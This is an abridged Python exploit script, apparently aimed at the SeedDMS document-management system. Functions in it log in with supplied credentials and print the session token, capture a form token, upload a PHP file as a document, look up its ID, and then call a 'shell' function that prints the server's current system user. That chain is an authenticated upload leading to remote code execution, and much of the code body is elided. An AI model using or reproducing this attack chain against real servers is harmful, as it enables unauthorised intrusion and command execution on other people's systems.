...
def login(sessionObj, username, password, url):
    ...
    postData = {"login": username, "pwd": password, "lang": "en_GB"}
    try:
        ...
        if rsl.status_code == 200:
            if "Error signing in. User ID or password incorrect." in rsl.text:
                ...
                print(
                    "[*] Session Token: "
                    + sessionObj.cookies.get_dict()["mydms_session"]
                )
                return sessionObj
...
def formTokenCapturing(sessionObj, url):
    path = "/out/out.AddDocument.php?folderid=8&showtree=1"
    url += path
    formToken = ""
    ...
    try:
        ...
        print("[!] Something Went Wrong in form capturing!")
        print(e)
        sys.exit(0)
...
def uploadingPHP(sessionObj, url, formToken):
    ...
    try:
        rsl = sessionObj.post(
            url,
            data=multiPartEncodedData,
            headers={"Content-Type": multiPartEncodedData.content_type},
        )
        ...
        print("[!] Something Went Wrong in uploading!")
        print(e)
        sys.exit(0)
...
def getDocID(sessionObj, url, docName):
    ...
    path = "/out/out.ViewFolder.php?folderid=8&showtree=1"
    url += path
    print(url)
...
def shell(sessionObj, url, docID):
    ...
    if rsl.status_code == 200:
        ...
        if rsl.text != "":
            ...
            print(
                "[*] System Current User: "
                + rsl.text.replace("<pre>", "").replace("</pre>", "")
            )
